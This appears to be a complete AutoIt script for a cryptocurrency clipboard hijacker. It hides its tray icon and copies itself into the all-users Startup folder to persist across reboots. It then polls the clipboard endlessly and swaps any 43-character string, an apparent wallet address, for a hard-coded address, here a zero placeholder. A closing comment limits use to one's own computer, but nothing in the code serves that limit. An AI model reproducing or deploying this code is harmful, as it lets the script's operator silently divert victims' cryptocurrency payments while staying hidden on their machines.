#NoTrayIcon ;hides an icon

Global $al = "43" ;address length
Global $adress = "0x0000000000000000000000000000000000000000" ; wallet to which the original wallet is to be changed

FileCopy(@ScriptFullPath,@StartupCommonDir); programme is started automatically when the system is booted

While 1
$clip=ClipGet(); read out the clipboard
ConsoleWrite($clip)

$lang=StringLen($clip); read out the length of the clipboard
ConsoleWrite($al)

if $lang==$al then ClipPut($adress);  if clipboard is an address it will be changed.

WEnd ; use that tool only on your own computer!
